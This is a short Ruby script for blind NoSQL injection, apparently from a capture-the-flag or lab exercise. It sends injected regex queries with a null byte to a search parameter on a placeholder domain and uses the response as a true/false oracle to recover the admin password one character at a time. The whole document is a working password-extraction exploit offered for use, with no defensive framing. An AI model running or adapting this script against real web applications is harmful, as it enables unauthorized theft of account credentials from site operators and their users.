# A basic script that will allow us to fuzz for NoSQL injections and retrieve passwords from a NoSQL database.

# Include http library
require 'httparty'

# Variable for domain
URL="domain.com"

# Function
def check?(str)
  resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
  # Check if response returns data certain data to match True or Flase state
  return resp.body =~ />admin</
end

#puts check?("a$").inspect
#puts check?("aaa").inspect

CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
password = ""

while true
  CHARSET.each do |c|
    puts "Trying; #{c} for #{password}"
    test = password+c
    if check?("^#{test}.*$")
      password+=c
      puts password
      break
    end
  end
end


